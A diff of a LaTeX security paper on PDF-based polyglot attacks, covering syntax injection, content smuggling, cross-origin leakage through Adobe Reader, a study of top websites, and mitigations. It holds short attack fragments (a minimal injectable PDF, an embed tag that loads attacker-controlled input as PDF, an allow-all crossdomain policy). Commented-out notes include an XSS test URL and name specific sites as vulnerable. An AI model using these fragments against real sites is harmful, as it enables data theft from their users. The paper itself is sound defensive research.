-Preventing syntax injection attacks on the server-side poses severe challenges.
-Even server-side filtering of HTML syntax to prevent cross-side scripting
-attacks has proved difficult due to the many contexts in which JavaScript can be 
-introduced. Filtering all potentially harmful tokens from all formats in which a 
-document may be interpreted is hardly possible.
-
-To prevent PDF-based syntax injection attack, the task is simpler. As discussed in Section~\ref{sec:pdf-injection}, the token-set identified in 
-Section~\ref{sec:pdf-injection}, are essential 
-to create valid PDF syntax. %, namely \emph{'$<$', '$>$', and '/'}.
-Filtering 
-user input to remove or encode these characters effectively mitigates the 
-vulnerability. 
-Luckily, because of the significant overlap with the token-set
-of HTML, many of the contexts where user input can occur are already being protected.
-Special attention is required in contexts are not traditionally filtered for 
-HTML tokens, e.g. JSON.
-
-\subsubsection{Content smuggling}
-\label{sec:smuggling-mitigation}
-The current best-practice recommendation from Google~\cite{Google:ContentHosting} 
-on hosting user-supplied content, is to serve the content from a sandboxed origin that is 
-completely separate, as per SOP, and isolated from the sensitive services. 
-These best-practices successfully prevents content smuggling 
-attacks, as the restrictions of the SOP prevents the content from accessing any sensitive 
-resources in the origin of the web service.
-
-These recommendations come with a caveat to be taken into consideration. Some user supplied 
-content is only meant to be accessible to certain authenticated users, e.g. photos that 
-are only shared with friends. In that case, the service needs to transfer the 
-credentials required to authenticate the user from the sensitive origin to the sandboxed 
-origin, without actually revealing the credentials used in the sensitive origin. 
-Revealing the credentials, e.g. using the same cookies on both origins, defeats 
-the purpose of the sandbox origin entirely. Currently there is no uniform solution 
-to this problem. Some common solutions are encountered: using the hashed 
-credentials of the sensitive origin; or generating public, but obscured, links 
-that are later shared manually.
-
-%\todo{Problem of transferring credentials between domains for services where the content requires authentication}
-
-%Google uses the domain name \emph{googleusercontent.com} to sandbox all the 
-%untrusted user files that their various services provide for their customers.
-
-\subsection{Browser}
-
-Traditionally, browser vendors have allowed the browser to override the 
-MIME-type provided by the server for compatibility reasons. This is a compromise 
-to deal with the situation that the server is confused as to what kind of content it is serving. This compromise 
-has repeatedly shown to lead to security issues. The affected browser vendors 
-can help mitigate this problem by limiting the ways content can be coerced to be 
-interpreted as a particular format.
-
-In the case of PDF-based polyglots, the browser can intervene when there is a 
-mismatch between the content-type provided by the server and the type attribute 
-of the \emph{object} tag. The vulnerability can be mitigated by acknowledging that there is a potential security issue in 
-interpreting the supplied content in the requested format and alerting the user to this
-threat.
-
-An intuitive approach would be to for the browsers to employ similar content-sniffing
-for content rendered in plug-ins, as is already done with content native to the browser.
-However, this intuition fails to take into account that the very reason for using plug-ins 
-is that the format is unknown to the browser. 
-One may argue that the browser is as confused as the originating server as to the 
-actual format of the content, and that the issue would be best resolved by the 
-corresponding plug-in.
-
-\subsection{Interpreter}
-
-As a general rule of thumb, the interpreter must at the very least alert the user if the served 
-content-type differs from the expected. A preferred alternative is to 
-not attempt to interpret the content at all. This holds true especially when 
-the served content-type is well known and radically different from that which 
-the interpreter is designed for.
-
-As for the PDF file format, the underlying design decisions have led to the 
-current parsing being very relaxed. 
-As discussed in Section~\ref{sec:pdf-based-polyglots} the PDF format is a container format; designed to 
-embed syntax from other files. 
-Even when parsing strictly according to 
-the specification, it is a simple task to create a PDF-based polyglot.
-Making the parsing more strict and enforcing many of the specified requirements 
-will make it harder to create polyglots, reducing the attack surface. 
-In accordance with this recommendation, Adobe has taken the first 
-steps to prevent PDF-based polyglots. Recent versions of the reader compares the first 
-bytes of the document against a set of known file signatures.
-While this is a step in the right direction, this kind of black listing has its drawbacks.
-The difficulty is that a number of file formats that lack a reliable 
-signatures, e.g., HTML.
-
-A different approach is restricting capabilities of the format, sticking to the 
-essential features. The more capable the format is, the more likely it is to 
-introduce security flaws. In the latest version of their reader Adobe has made 
-progress also in this respect 
-by restricting the possibilities for bidirectional communication.
-
-%1 page 
-\section{Related work}
-\label{sec:related}
-Backes et al.~\cite{Backes+:SP07} explore the power of the PostScript
-language. PostScript allows executable content and access to sensitive
-information from the environment such as the user id. This work
-demonstrates how to compromise reviewer anonymity in a peer-reviewing
-process by maliciously crafting a PostScript document.
-
-As discussed in Section~\ref{sec:cross}, 
-GIFAR~\cite{Brandis:GIFAR} is based on polyglots that combine the GIF and JAR (Java
-archive) formats. The former is used as benign and the latter as
-malicious to bypass SOP. The Java virtual machine vendors have since
-then mitigated these attacks by patching the virtual machine to be
-more conservative on the format of the executed files.
-
-PDFAR~\cite{PDFAR:09} polyglots combine the PDF and JAR formats, where
-PDF serves as benign and JAR serves as malicious. Such a polyglot is
-possible due to the liberty of the requirements on the headers of PDF
-files. Mitigation against GIFAR attacks in the Java virtual machine
-effectively applies to PDFAR attacks.
-
-Nagra~\cite{Nagra:09} demonstrates GIF/JavaScript polyglots by the
-same file being interpreted as a script and as an image and
-informally discuses possible security implications.
-
-Barth et al.~\cite{Barth+:SP09} focus on security implications of
-content sniffing by browsers. They present content-sniffing XSS
-attacks by crossbreeding HTML with other formats like PostScript. They
-show attacks on real systems like HotCRP, where an uploaded conference
-paper in the PostScript format is interpreted as malicious HTML by the
-browser. They also propose a content-sniffing algorithm that does not
-suffer that helps defending against these class of attacks while
-maintaining compatibility.
-
-Sundareswaran and
-Squicciarini~\cite{Sundareswaran:Squicciarini:CEAS10,Sundareswaran:Squicciarini:SecureComm10} discuss image
-repurposing for GIFAR attacks. They present the AntiGifar tool for
-client-side protection. AntiGifar models the benign behavior of a user
-by a control-flow graph and detects possible anomalies when the
-interactions of the user and browser with the web site deviate from
-the control-flow model.
-
-As mentioned in Section~\ref{sec:cross}, Huang et
-al.~\cite{Huang+:CCS10} study an HTML/CSS attack. This attack injects
-fragments of CSS syntax in a HTML document, thereby making it a
-HTML/CSS polyglot. The error-tolerant parsing of style sheets allow
-the polyglot to parsed as valid CSS. The capabilities of CSS provide
-trivial cross-origin leakage. As discussed earlier, the paper's
-defense technique has been adopted by all major browsers, which
-implies that the attacks outlined in their paper are now ineffective.
-
-Wolf's OMG WTF PDF presentation~\cite{Wolf:CCC10} is one of the 
-inspirations for our work. The presentation explores the liberty
-of the PDF format. In addition, it highlights that PDF interpreters
-often disregard the specification demands. This is particularly
-relevant as it allows crossbreeding PDF with such
-formats as ZIP and EXE.
-
-Heiderich et al.~\cite{Heiderich+:CCS11} explore the Scalable Vector
-Graphics (SVG) format. They discover attacks that allow SVG files,
-embedded via the \emph{img} tag, to run arbitrary JavaScript. 
-One of the
-attack vectors involves an SVG/HTML polyglot
-that behaves differently depending on the context in which it is
-accessed. When included in the \emph{img} tag, the file is interpreted as SVG,
-whereas when it is accessed directly it is interpreted as malicious HTML.
-
-%1 page 
-\section{Conclusions}
-\label{sec:conc}
-We have put a spotlight on a new breed of attacks that smuggle
-malicious payload formatted as benign content. We have identified
-polyglots as the root cause for this class of attacks. In a systematic
-study, we have characterized the necessary ingredients for
-polyglot-based attacks on the web and arrive at the PDF format to be
-particularly dangerous. Our empirical studies in the web setting
-confirm vulnerabilities in the current content filters both in the
-server side and in browsers, as well as in the PDF interpreters.
-These vulnerabilities open up for insecure communication across
-Internet origins and allow attacking web sites from the top 100 Alexa
-list. To mitigate the attacks, we suggest general measures against
-polyglot-based attacks.  These measures are a combination of
-protection on the server side, in browsers, and in content
-interpreters such as PDF readers.
-
-The affected vendors have been made aware of the
-vulnerabilities. These vendors include Adobe (notified instantly after
-discovering the security implications of polyglot PDFs)
-%in late 2009
-and the major browser vendors. We have also contacted the vulnerable
-web sites from the top 100 Alexa list.
-%
-Following responsible disclosure, we refrain from providing the names of the vulnerable web sites.
-
-Future work includes identification of further formats vulnerable to
-polyglot-based attacks. Versatile media content formats such as the
-Windows Media Video format are of particular concern because of their
-potential for executing scripts. Further investigation of the PDF
-format might lead to enhanced possibilities to bypass content filters
-by alternative character sets.
-
-% We also plan to extend the empirical study to popular services like
-% HotCRP, Europass CV, and arXiv.org that allow uploading PDF
-% documents. Authorization is pending for an in-depth security study of
-% a major conference management system.
-
-%1-2 pages 
-\bibliographystyle{plain}
-\bibliography{literature}
-
-\appendix
-
-\section{Code samples}
 \begin{lstlisting}[label=lst:sample-pdf, caption=Sample PDF file]
@@
 
+\subsection{PDF-based polyglots}
+\label{sec:pdf-based-polyglots}
+Several design choices in the PDF specification make the format particularly 
+suitable for making polyglots. One such design choice is the error tolerant 
+parser. This is in part motivated by another design choice namely PDF being a container format. 
+%of which the 
+This implies
+%implication is 
+that a PDF file can, by design, contain foreign syntax that 
+could interfere with the syntax of the file. Another motivation is that PDF 
+files are designed to be both forward- and backward-compatible. Readers 
+implementing an older version of the specification do not recognize new 
+features and behave as if they were not present in the file. 
+%
+The implementation notes of the specification describes some exceptions to the
+requirements of the specification, such as the header can occur 
+anywhere within the first 1024 bytes of the file. This flexibility gives plenty of room for 
+combining with syntax of another format.
+%
+The specification declares many components to be required in a
+PDF file, but as can be seen in Section~\ref{sec:format}, in practice several 
+components can be omitted~\cite{Wolf:CCC10}. The code in Listing~\ref{lst:minimal-pdf} shows the 
+minimal syntax required for a malformed, but valid PDF file.
+%incrementally 
+%updated by appending updated versions of existing objects to 
+%the end of the file. In fact, 
+%and formats. This and the fact that it is designed to be robust against errors,
+%provides us with a format that is powerful, flexible and ideal for creating
+%malicious polyglots.
+
+\begin{lstlisting}[label=lst:minimal-pdf, caption=Minimal PDF file]
+%PDF-
+trailer<</Root<</Pages<<>>>>>>
+\end{lstlisting}
+
+% - Execute JavaScript
+% - Embed Flash files
+% - Launch commands
+% - Network requests
+
+Furthermore the PDF format is of particular interest to us because of its 
+many capabilities. Some examples include executing JavaScript, launching commands, 
+and issuing HTTP requests. The HTTP requests are restricted to the origin of the 
+PDF file, and will include any cookies associated with that origin. 
+Adobe Reader also includes a Flash 
+runtime to play embedded Flash files on systems that do
+not have the Flash runtime installed. %Considering that it might be a conscious decision
+%of the user to refuse a flash player,
+
+%\subsection{Embedded PDF documents}
+
+When a PDF document is embedded in a web page, the corresponding plug-in 
+is executed to render the content. Recall from Section~\ref{sec:cross-origin} 
+that the plug-in is selected based 
+on the MIME-type, either supplied by the server or in the type attribute
+%
+with preference for the later.
+%
+Also recall
+that the browser rely on the plug-in to handle the situation when the MIME-type 
+supplied by the server is inconsistent with the MIME-type of the plug-in.
+In the case of the Adobe Reader plug-in, it disregards the MIME-type
+supplied by the server and will attempt to interpret any content as PDF. 
+Listing~\ref{lst:embed-pdf} shows how 
+arbitrary content can be rendered as PDF format.
+
+\begin{lstlisting}[label=lst:embed-pdf, caption=HTML for embedding PDF content]
+<embed type="application/pdf" 
+src="vulnerable.com/?input=%PDF...">
+\end{lstlisting}
+
+In recent versions of Adobe Reader certain measures have been taken to prevent 
+creating PDF-based polyglots. In accordance with our recommendations, Adobe Reader 
+has made the parsing more strict by attempting to match the first bytes of the 
+file against a set of known signatures. If 
+a match is found, the parser will abort loading of the document. 
+However, this does not fully defend against PDF-based polyglot attacks.
+The problem of 
+this approach is that there are a number of file formats that lack a reliable 
+signature, e.g., HTML. Also, for this approach to be reliable, the signature 
+must match the signature enforced by other interpreters of the format. A notable 
+counterexample is the signature used for the JPG format. While the signature is 
+correct according to the specification of the format, several JPG interpreters
+will allow slightly malformed signatures. Such a malformed signature will bypass 
+the check in Adobe Reader and still be rendered correctly in a viewer. This opens up for PDF-based
+polyglot attacks.
+
+\subsection{PDF attacks}
+
+As explained in Section~\ref{sec:vectors} there are two vectors for polyglot 
+attacks; \emph{syntax injection} and \emph{content smuggling}. PDF is a suitable 
+format for both vectors as it is both a text based format with error tolerant parsing, 
+and has widespread acceptance as a document format, often preferred over 
+other document formats.
+
+\subsubsection{Syntax injection}
+\label{sec:pdf-injection}
+As the scenario details in Section~\ref{sec:injection}, the attacker in a syntax 
+injection attack manipulates a vulnerable service to include PDF syntax in existing content, e.g. HTML-documents.
+The PDF syntax is typically injected through user input used by the vulnerable service in the composition of documents.
+%
+An example of a suitable fragment to inject is shown in Listing~\ref{lst:xml-pdf}.
+%
+The resulting content is subsequently 
+embedded in the attackers page as PDF, as exemplified in Listing~\ref{lst:embed-pdf}.
+As mentioned in Section~\ref{sec:pdf-based-polyglots}, the embedded PDF can issue 
+requests to the origin it came from, carrying the cookies associated with that origin.
+These requests allow for the extraction of sensitive user data that can either be 
+communicated back to the attacker, or be leveraged in further attacks.
+
+Thus far, exploitation of vulnerable services have been discussed, excluding the specific 
+conditions under which a service is vulnerable. In order to exploit the 
+vulnerability, the injected syntax must pass through any existing filters 
+unchanged or at least with its semantics preserved. If user input in an 
+HTML-document is not sanitized, any syntax would be unchanged and 
+the service is vulnerable to less sophisticated attacks, e.g. cross-site scripting, 
+therefore sanitized user input is of greater concern.
+%
+Based on the PDF samples in Listings~\ref{lst:minimal-pdf} and~\ref{lst:xml-pdf}, we can derive 
+the set of tokens required to build a PDF. Assuming that alpha-numeric characters 
+pass through a sanitization filter unmodified, the set of tokens is $\{\%, <<, >>, /\}$.
+As can be noted, there is a small but significant overlap with the tokens of HTML, 
+which implies that many web sites protected against cross-site scripting attacks 
+are also protected against PDF-based polyglot attacks. One of the problems of 
+filtering input for inclusion in a web page are the many contexts in which the 
+input can be included. A problem made even more complex by the diversity of 
+languages the page contains. Language incompatibilities force context dependent 
+filtering, where the same input is treated differently based on the context in 
+which it is included. In certain contexts angle brackets are often left untouched by filters.
+
+\paragraph{HTML comments}
+No HTML enclosed in comments, "$<$--" and "--$>$", will be rendered, and therefore 
+filters consider this context safe. To prevent input from escaping the comment by 
+injecting an end comment token, certain filters remove any occurrences of "--$>$", 
+but leave the rest of the input untouched. HTML comments are meaningless to PDF, 
+and the result is a valid HTML/PDF polyglot.
+
+\paragraph{JavaScript strings}
+In an in-line JavaScript context, user input is often included in the shape of a 
+JavaScript string, delimited by single or double quotes. In this context only a 
+few characters require encoding, as they can break the string context. Naturally, 
+any single or double quotes need escaping, as well as any carriage return or 
+line feed characters. In the spirit of making minimal changes to the input, 
+certain web sites only escape these characters. This is sufficient to prevent cross-site 
+scripting attacks, but fail to protect against PDF-based polyglot attacks.
+
+Not only in-line JavaScript fall short in this regard. JavaScript object notation 
+(JSON) is used in modern web sites as a data transport. This is particularly 
+common in web sites that provide an API to interact with the offered services.
+JSON encoded information suffer the same problem as in-line JavaScript, thereby
+extending the attack surface further.
+
+\subsubsection{Content smuggling}
+
+Due to the nature of the PDF, it can without much effort be combined with just 
+about any other format. This provides ample opportunity to create malicious 
+polyglots where PDF is either the benign or the malicious format. Consequently, 
+this significantly expands the attack surface, making it important to take 
+measures to protect against these attacks.
+
+\paragraph{PDF as the benign format}
+%\todo{Services that accept PDFs, PDFs can be used to hide another malicious format}
+Services like job brokers commonly let the user upload a CV in the form of a PDF-file.
+Before such PDF-files are published to recruiters, they are verified to not 
+contain any malicious payload. Such a verification only extends to the PDF format itself.
+An attacker can produce a PDF that is valid and 
+benign, but also a polyglot hiding another malicious format, such as Flash. As 
+described in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
+uploaded PDF file is then embedded on the attacker's web site, but now as the 
+malicious format. Using social engineering, the attacker can persuade 
+the victim to visit the web site.
+
+Creating a PDF/Flash polyglot is no major challenge.
+A proof-of-concept can easily be created by storing the PDF source code as a static string 
+variable in the malicious Flash source code. When compiling Flash, the output is 
+compressed by default to save space, thereby obfuscating the PDF source code. However, tools exist 
+that decompress the Flash files, which restores the plain PDF code.
+
+\paragraph{PDF as the malicious format}
+As detailed in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
+attacker uploads the PDF polyglot to a vulnerable content hosting service. 
+A server-side verification process will base its verification on the benign formats 
+it expects to receive. The polyglot is designed to verify correctly as the benign format,
+and the verification is likely to miss the malicious PDF components, as it is unaware of the alternate interpretation of the content.
+
+Given the extensive capabilities of the PDF format, exploiting a content smuggling 
+vulnerability with a PDF-based polyglot attack, can be done without much effort.
+To prevent the attack, the 
+verification process have to actively search for and remove PDF specific syntax.
+The impact of exploitation depends on the payload used in the attack.
+
+\subsection{PDF payloads}
+%\todo{rewrite section, focus on embedded flash, xxe and code samples}
+%
+As discussed in Section~\ref{sec:payloads}, there are two approaches to exploiting 
+these vulnerabilities; cross-site request forgery, and cross-origin information leakage.
+Both of these require extracting information from the vulnerable service, which is something that can be achieved using the capabilities of the PDF format.
+
+In order to extract information and leak across origins, a communication channel
+is established. PDF documents provide multiple ways of generating HTTP requests; 
+many of which allow cross-origin communication, but are, out of security concerns, only one-way in the sense that 
+the PDF document will never see the result. Therefore, the focus is directed towards 
+two methods that allow bidirectional communication; XML external entities, and embedded Flash. 
+ Since the document will retain the 
+origin from which it was served, all 
+requests issued from the document will include any cookies associated with the target origin.
+
+%When embedded in a web page, many of the PDF communication methods utilize
+%the underlying browser to make requests by navigating the browser to the target 
+%URL. This will unload the current page in which the document is embedded. Arbitrary page 
+%navigation is allowed with respect to SOP, since the response is not visible 
+%to the document. Such methods can be used in CSRF attacks, but would 
+%defeat the purpose of requesting information as the document cannot process the 
+%response.
+
+% Cross-origin leaks
+%To leak information across origins, a communication channel is 
+%required between the attacker and the target. PDF provides the necessary means 
+%to mediate this information leakage. The flow of information can be divided into 
+%two steps, extracting information from the target and delivering it to the attacker.
+%Each requiring its own communication methods.
+
+%\subsubsection{The target}
+%There are two methods for a PDF file to communicate with the server it originates from, 
+%both allowing it to read the response: from JavaScript using XML external entities 
+%and from an embedded flash file.
+
+\paragraph{XML External Entities}
+The PDF JavaScript API includes a method to parse XML documents, called 
+XMLData.parse. The XML document being processed may in turn rely on external entities, 
+required for the parsing of the document, which the XML parser will request. The request is 
+bound to the origin of the document, and the response is included in the XML document. 
+The source code of the XML document reflects this response and can be retrieved at a later point,
+resulting in a bidirectional communication channel.
+%
+As the response 
+is included in the XML, the result has to be well-formed XML. This puts a 
+restriction on the content that can be requested using this method. Considering 
+that HTML pages are rarely well-formed this method may be too restricted in practice.
+
+Listing~\ref{lst:xml-pdf} contains an example PDF document that uses XML external 
+entities. Note that the one-way method \emph{getURL} is used to communicate the 
+information back to the attacker. Given the compact size of the example, it is useful for the syntax 
+injection scenario in Section~\ref{sec:injection}, which require injection of 
+small syntax fragments.
+
+As of version 10.1.5, in accordance with our recommendations,  XML external entities 
+has been removed. Thereby the risks of leakage of sensitive information is significantly reduced.
+
 \begin{lstlisting}[label=lst:xml-pdf, caption=PDF using XML for communication]
@@
 
+\paragraph{Embedded Flash}
+By embedding a Flash file in the PDF document the capabilities of the format can be 
+extended even further. The Flash runtime supports bidirectional communication in 
+accordance with SOP.
+%
+The embedded Flash inherits the origin of the PDF document, thus it can 
+request and read any document from the originating server. Unlike the XML
+method, there are no restrictions on what content can be requested, thus making 
+it the most versatile of the available communication methods. The only drawback 
+using this approach is the significant increase in terms of file size. Even the compact 
+Flash code in Listing~\ref{lst:flash-pdf} will result in a 6 kB Flash file. 
+This suggests that this method might be better suited for the content smuggling 
+scenario in Section~\ref{sec:smuggling}, rather than the syntax injection scenario.
+
 \begin{lstlisting}[label=lst:flash-pdf, caption=Flash code for communication]
@@
 \end{lstlisting}
+
+Cross-origin communication in Flash adheres to the same-origin policy. However, this is not a restriction, since
+ Flash also supports cross-origin communication via  
+cross-origin resource sharing. Using CORS, a web server can relax the SOP to allow access to specified content.
+%As mentioned, the embedded Flash file inherits the origin of the document.
+An attacker can set an allow-all cross-origin policy, such as in Listing~\ref{lst:crossdomain}, 
+that open up for two way communication.
+
+\begin{lstlisting}[label=lst:crossdomain, caption=Allow-all crossdomain.xml]
+<?xml version="1.0"?>
+<cross-domain-policy>
+  <allow-access-from domain="*" />
+</cross-domain-policy>
+\end{lstlisting}
+
+%\subsubsection{The attacker}
+%There are a number of ways to communicate with the attacker, either directly 
+%via the embedding page or through the attackers server. As mentioned previously, 
+%many methods trigger page navigation in the browser. This will result in a 
+%noticeable change in the victims browser. While it fulfills the purpose of 
+%leaking information, an attacker can use more covert methods of communication
+%to refrain from alerting the victim.
+
+%\paragraph{Fragment identifier}
+%The methods that navigate the browser can still be used for a somewhat covert 
+%communication with the attacker. Navigating to the same page with a different 
+%fragment identifier will not reload the page. Embedding the information in the fragment 
+%identifier of the URL of the embedding web site, creates a one-way communication 
+%channel from the document to the page. Since the fragment identifier is visible 
+%in the address field of the browser, an alert user would notice it changing.
+
+%\paragraph{PostMessage}
+%The PDF plugin includes an API for communicating directly with the page in 
+%which it is embedded. The document can send messages to the page using 
+%the hostContainer.postMessage method. The page registers a handler to receive 
+%the event and is also able to post messages back to the document.
+%This two way communication is not visible to the victim.
+
+%\paragraph{Embedded Flash}
+
+%3 pages 
+\section{Evaluation}
+\label{sec:eval}
+
+This section details the evaluation performed to investigate the prevalence of 
+the vulnerabilities from Section~\ref{sec:vuln}. The evaluation covers various 
+instances of affected components, such as browsers and PDF interpreters, 
+content sanitization filter, and a study of the Alexa top 100 web sites.
+
+\subsection{Instances}
+
+To better understand how this problem presents itself, a comparison of browser and reader instances 
+is presented. We compare all major browsers and two of the most common readers.
+
+\subsubsection{Readers}
+\label{sec:readers}
+Section~\ref{sec:vuln} focuses on the Adobe PDF Reader as the attack surface, 
+due to its standing as the most commonly used reader. To give a comparison, the 
+Google Chrome built-in PDF reader was selected as it is the default reader to 
+users of the browser.
+
+As mentioned in Section~\ref{sec:cross}, the browser rely on the reader plug-in to 
+implement correct security measures, in order to prevent cross-domain leakage. 
+Unlike Adobe Reader, the Chrome browser built-in PDF reader refuses to render 
+content that was served with an inappropriate MIME-type if the content is 
+delivered across origins. This effectively prevents the attacks in Section~\ref{sec:vuln}.
+If the Chrome browser is configured to use the Adobe Reader plug-in, it will 
+behave the same as in other browsers and the content will be interpreted as PDF.
+
+\subsubsection{Browsers}
+
+The behavior of cross-domain embedding of PDF resources is studied in the major 
+browsers, i.e., Firefox, Safari, Opera, Google Chrome and Internet Explorer. 
+The study shows that all major browsers are susceptible to the attacks outlined 
+in Section~\ref{sec:vuln}, with some minor differences detailed below and summarized in Table~\ref{tab:comparison}.
+In Table~\ref{tab:comparison}, "Yes" for the columns "object" and "embed" indicates that the 
+corresponding tag can be used to embed a PDF document, and for the column 
+"Adobe is default" it indicates that Adobe Reader is commonly the default PDF reader.
+
+\paragraph{Firefox, Safari and Opera}
+The browsers, Firefox, Safari and Opera, are all susceptible to the attacks outlined as 
+per Section~\ref{sec:vuln}, without any restrictions or modifications.
+
+\paragraph{Internet Explorer}
+Microsoft's browser, Internet Explorer, is susceptible to the attacks. However, 
+it seems to only support embedding of PDF documents using the \emph{embed} tag. 
+This is not a major obstacle in exploiting the vulnerability, as the embed and 
+object tags are interchangeable in this respect.
+
+\paragraph{Google Chrome}
+Google's browser, Chrome, has built-in support for displaying PDF documents. 
+The built-in PDF reader is used by default by the browser, unless it has been 
+explicitly disabled by the user. Certain complex PDF documents can not be 
+handled by the built-in reader. The built-in reader will then prompt the user 
+to open the document in Adobe Reader. As previously noted in Section~\ref{sec:readers}, the built-in reader 
+is not vulnerable to attacks. Hence, Chrome is only susceptible when the Adobe 
+Reader plug-in is used to render the document.
+
+\begin{table}[h!]
+\begin{tabular}{l|c|c|c}
+& object & embed & Adobe is default \\ \hline
+Firefox & Yes & Yes & Yes \\ \hline
+Chrome & Yes & Yes & No \\ \hline
+Safari & Yes & Yes & Yes \\ \hline
+Opera & Yes & Yes & Yes \\ \hline
+Internet Explorer & No & Yes & Yes %\\ \hline
+\end{tabular}
+\caption{Comparison of browsers}
+\label{tab:comparison}
+\end{table}
+%\subsection{Bypassing content filters}
+
+%\subsubsection{Server-side upload filters}
+
+%As discussed in Section~\ref{sec:cross} server-side content filters that 
+%validate files based on content type are not equipped to handle polyglot 
+%content. For polyglot content, specialized filters are required that analyze 
+%the content based on all considerable interpretations of the content. No such 
+%filters were encountered in this study.
+
+%\subsubsection{Cross-site scripting filters}
+%\todo{install NoScript?}
+%This effectively bypasses any cross-site scripting filters such as NoScript or
+%filters built into browsers. Since the Reader plug-in handles the response, the
+%browser never gets to see the content
+
+%\subsubsection{Context sensitive filters}
+
+%Context sensitive cross-site scripting filters, that remove or encode characters
+%Clever filters that adapt their filtering to the context in which the user
+%content is included. Basically filters that allow input that do not form harmfulHTML.
+
+% Don't want to claim something I have no basis for..
+
+\subsection{Alexa top 100}
+We have conducted two
+studies to evaluate the prevalence of the problem on popular sites, 
+covering the Alexa top 100 web sites. Because of their dominance 
+on the web, these web sites are also the most exposed to security threats.
+The first study covers PDF-based polyglot attacks using syntax injection as the 
+infiltration method; the second covers content smuggling.
+%It does not involve polyglot attacks based on content smuggling, as 
+%potential targets generally require authentication before submitting content.
+We refrain from mentioning names of individual web sites to prevent exploitation 
+before the issues have been properly dealt with.
+We are in contact with the maintainers of the web sites to help
+mitigate the vulnerabilities.
+
+\paragraph{Syntax injection}
+The study is based on supplying the web sites with the benign minimal PDF in 
+Listing~\ref{lst:minimal-pdf}, and examining the corresponding responses to this input.
+The sample contains the essential keywords and tokens required to perform a syntax 
+injection based polyglot attack. If these tokens pass through unaltered, the web site is 
+considered vulnerable. The process has been conducted manually and only input 
+parameters on publicly accessible pages, those that do not require authentication, 
+were tested. Considering that most inputs are available only to authenticated 
+users, the results suggests that more web sites are likely vulnerable in input that do
+require authentication.
+
+The conclusion is 
+that nine web sites out of the hundred apply insufficient content filtering with 
+respect to the PDF format. Out of the nine found to be vulnerable; five were 
+susceptible to PDF based polyglot attacks, and four applied 
+insufficient content filtering, but the input was reflected in a way that 
+prevented exploitation, e.g. the header appeared after 1024 bytes.
+%
+%, which have the potential of compromising the 
+%confidentiality and integrity of the web site's users.
+%
+
+Three of the five vulnerable web sites could also be determined to be vulnerable to 
+traditional XSS attacks in the same input parameters. 
+The remaining two web sites found susceptible only to polyglot attacks and not XSS attacks
+are of particular interest since they employ proper measures to protect 
+against XSS attacks, and yet fall short in defeating this new breed of attacks.
+
+\begin{enumerate}
+\item The first web site reflected user input in an inline  
+JavaScript context, inside a string. To prevent cross-site scripting in this 
+context, the following measures were taken: the JavaScript string delimiters 
+and the backslash character were properly escaped, and the 
+string "$<$/script$>$" was removed. These measures are sufficient to protect against XSS attacks, 
+but do not prevent an attacker 
+from injecting valid PDF syntax.
+\item The second web site reflected the user input in an HTML-comment context. 
+The only measure taken to prevent XSS attacks in this context was removing any 
+occurrence of the character sequence "--$>$". Again, while successfully preventing 
+XSS attacks, this measure is ineffective in preventing an attacker from injecting PDF syntax.
+\end{enumerate}
+
+\paragraph{Content smuggling}
+Further, a smaller study was conducted, not covering the full Alexa top 100, but 
+targeting popular cloud storage services. 
+This study is based on polyglot content being uploaded to the service and 
+subsequently analyzed to determine which origin it was served 
+under. We have found two major 
+enterprise cloud storage services to be susceptible to attacks. Both services make an effort to
+follow current best practices, see Section~\ref{sec:smuggling-mitigation}, but 
+fail to cover certain scenarios for content upload.
+
+The first service serves almost all uploaded content from a sandboxed origin; the exception being the user's 
+avatar image that are served under the sensitive origin. An attacker could 
+upload a specially crafted avatar image that, when embedded as PDF on the attackers 
+web site, can access and modify the contents of the victim's cloud storage.
+
+The second service lets the user publish a public link to an HTML 
+representation of the content. The content is served under the sensitive origin 
+and is therefore carefully processed to prevent 
+generation of malicious HTML, but fails to take other formats into account.
+A specially crafted file will result in the generation of valid PDF syntax that, when embedded as PDF on the attackers 
+web site, can access and modify the contents of the victim's cloud storage.
+
+We are currently advising both service providers to help mitigate these vulnerabilities.
+
+%Baidu.com (allows <>, but escapes /) 
+%LinkedIn (allows <>, but escapes /) 
+%Soso (allows <>, but escapes /) 
+%Youku (vulnerable to traditional XSS) 
+%Soku (vulnerable to traditional XSS) 
+%alibaba.com (allows <>, but escapes /)
+%about.com (vulnerable to traditional XSS,
+%http://linux.about.com/sitesearch.htm?q=XSS&SUName=--%3E%3Cimg+src=x+onerror=alert%281%29%3E)
+%sogou.com (potential target
+%http://www.sogou.com/web?query=%25PDF+%3C%3C+%2F+%3E%3E&_asf=www.sogou.com&_ast=1349689275&w=01019900&p=40040100&sut=11010&sst0=1349689274528)
+
+%1-2 pages 
+\section{Mitigation}
+\label{sec:mit}
+This section gives advice on various mitigation approaches available for each of the
+affected components, both server-side and client-side. 
+We provide one general mitigation approach that covers a significant segment of 
+the potential attack vectors, and provide specific mitigation suggestions for affected 
+components.
+
+Note that although some of the mitigation suggestions discussed below are already in place
+(notably as implemented by the Chrome builtin PDF reader), the state of the art
+is far from being satisfactory. As our paper demonstrates, the
+polyglot attacks are a real threat. It is the paper's main value to
+bring attention to polyglot attacks and the importance of
+mitigation against them.
+
+\subsection{General approach}
+It should be noted that 
+preventing polyglots, and thereby polyglot attacks, in the general case is a complex task, as one would 
+need to take all potentially malicious formats in to account. Mitigating instances of 
+polyglot attacks based on particular formats are significantly more straightforward. 
+Our approach is not attempting to prevent polyglots as such, but provide details about 
+the context in which the content will be interpreted, such that an informed decision 
+can be made on whether rendering the content constitutes a security risk or not.
+
+The relation between web server and the browser is central in a web environment, but 
+there is no common agreement on the type of content communicated between server 
+and client. As mentioned in Section~\ref{sec:cross-origin}, in each response the web server sends a 
+header representing its view on the type of content delivered, however, the browser
+is free to ignore the provided type and can even be instructed to do so.
+Often the browser knows precisely the context in which the content will be 
+rendered and the types suitable for these contexts. 
+%
+As an example, when content is loaded in an object-tag with a type attribute, as 
+is the case throughout the paper, the browser already
+has exact knowledge as to which types the requested content can be interpreted as in this context. A natural
+defense technique is to send the expected types along with the request. The web server
+then compares the expected types to the assumed type and react accordingly, e.g., 
+if the assumed type is HTML and the expected type is PDF, an 
+error can be sent back to the client. On the client side, the browser verifies 
+the type in the response matches any of the expected types, possibly alerting 
+the user if there is a mismatch. This mutual agreement between client and server
+can help mitigate both syntax injection and content smuggling.
+Furthermore, this approach can be implemented in the
+web server itself, as opposed to a web application, since the web server makes the
+final decision on the supplied content-type.
+
+The expected type is useful also to a web application that performs content 
+filtering on the fly. At the point when the content is being requested, it only 
+requires verification against the expected type.
+
